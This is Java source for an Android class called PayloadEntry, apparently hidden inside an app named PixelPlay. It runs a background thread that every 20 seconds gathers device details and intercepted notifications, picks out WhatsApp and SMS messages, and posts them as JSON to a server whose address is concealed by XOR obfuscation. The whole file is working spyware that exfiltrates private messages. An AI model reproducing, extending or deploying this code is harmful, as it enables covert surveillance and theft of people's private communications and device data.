package com.pixelplay.payload;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class PayloadEntry {

    private static final String TAG = "PixelPlay";
    private static final long INTERVAL = 20000;
    private static final byte[] XK = {0x4A, 0x7D, 0x2B, 0x6F, 0x1C, 0x5E, 0x3A, (byte)0x8F};
    private static final byte[] _H = {
        0x0E,0x38,0x78,0x24,0x48,0x11,0x6A,(byte)0xA2,
        0x03,0x45,0x7D,0x3F,0x24,0x15,0x74
    };
    private static final byte[] _P = {0x65,0x18,0x53,0x09,0x75,0x32};

    private static boolean running = false;
    private static Thread worker;

    private static String dec(byte[] e) {
        byte[] d = new byte[e.length];
        for (int i = 0; i < e.length; i++)
            d[i] = (byte)(e[i] ^ XK[i % XK.length]);
        return new String(d);
    }

    public static void start(Context ctx) {
        if (running) return;
        running = true;
        worker = new Thread(() -> loop(ctx));
        worker.setDaemon(true);
        worker.start();
        Log.d(TAG, "[+] payload entry started");
    }

    private static void loop(Context ctx) {
        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
        while (running) {
            try { send(ctx); } catch (Exception e) {
                Log.e(TAG, "err: " + e.getMessage());
            }
            try { Thread.sleep(INTERVAL); } catch (InterruptedException e) { break; }
        }
    }

    private static void send(Context ctx) {
        try {
            JSONObject p = new JSONObject();
            p.put("device", getDev());

            JSONArray caps = getCapturedNotifs();
            p.put("notifications", caps);
            JSONArray wa = new JSONArray();
            JSONArray sms = new JSONArray();
            for (int i = 0; i < caps.length(); i++) {
                JSONObject n = caps.getJSONObject(i);
                String pkg = n.optString("package", "");
                if ("com.whatsapp".equals(pkg))
                    wa.put(n);
                if (pkg.contains("messaging") || pkg.contains("sms") || pkg.contains("message"))
                    sms.put(n);
            }
            p.put("whatsapp", wa);
            p.put("sms", sms);

            String json = p.toString(2);
            Log.d(TAG, "[+] payload size: " + json.length());

            String host = dec(_H);
            String path = dec(_P);
            String url = "http://" + host + ":8080" + path;

            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true);
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            OutputStream os = c.getOutputStream();
            os.write(json.getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();
            Log.d(TAG, "[+] payload sent: " + c.getResponseCode());
            c.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "send err: " + e.getMessage());
        }
    }

    private static JSONObject getDev() throws Exception {
        JSONObject o = new JSONObject();
        o.put("android", Build.VERSION.RELEASE);
        o.put("sdk", Build.VERSION.SDK_INT);
        o.put("manufacturer", Build.MANUFACTURER);
        o.put("model", Build.MODEL);
        o.put("patch", Build.VERSION.SECURITY_PATCH);
        return o;
    }

    private static JSONArray getCapturedNotifs() {
        JSONArray a = new JSONArray();
        try {
            Class<?> bridge = Class.forName("com.pixelplay.app.NotificationBridge");
            java.lang.reflect.Method m = bridge.getMethod("getCaptured");
            @SuppressWarnings("unchecked")
            java.util.List<JSONObject> caps = (java.util.List<JSONObject>) m.invoke(null);
            synchronized (caps) {
                for (JSONObject n : caps) a.put(n);
            }
        } catch (Exception ignored) {}
        return a;
    }
}
